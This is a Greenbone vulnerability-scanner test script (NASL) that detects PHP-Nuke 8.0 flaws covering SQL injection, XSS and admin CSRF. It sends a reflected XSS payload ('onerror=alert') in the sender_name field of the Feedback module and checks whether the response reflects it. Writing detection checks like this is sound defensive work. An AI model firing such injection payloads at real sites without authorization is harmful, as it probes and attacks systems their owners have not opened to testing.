CPE = "cpe:/a:phpnuke:php-nuke";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902600" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-07-01 16:09:45 +0200 (Fri, 01 Jul 2011)" );
	script_cve_id( "CVE-2011-1480", "CVE-2011-1481", "CVE-2011-1482" );
	script_bugtraq_id( 47000, 47001, 47002 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "PHP-Nuke Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_php_nuke_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "php-nuke/installed" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary
  SQL commands, inject arbitrary web script or hijack the authentication of administrators." );
	script_tag( name: "affected", value: "PHP-Nuke versions 8.0 and prior." );
	script_tag( name: "insight", value: "Multiple flaws are due to:

  - An improper validation of user-supplied input to 'chng_uid', 'sender_name'
  and 'sender_email' parameter in the 'admin.php' and 'modules.php'.

  - An improper validation of user-supplied input to add user accounts or grant
  the administrative privilege in the 'mainfile.php'." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running PHP-Nuke and is prone to multiple
  vulnerabilities." );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/66278" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/66279" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/66280" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
host = http_host_name( port: port );
authVariables = "sender_name=\"><img src=x onerror=alert(/VT-XSS-Test/" + ")>&sender_email=&message=&opi=ds&submit=Send";
filename = dir + "/modules.php?name=Feedback";
req = NASLString( "POST ", filename, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Referer: http://", host, filename, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( authVariables ), "\\r\\n\\r\\n", authVariables );
res = http_keepalive_send_recv( port: port, data: req );
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "onerror=alert(/VT-XSS-Test/)" )){
	report = http_report_vuln_url( port: port, url: filename );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

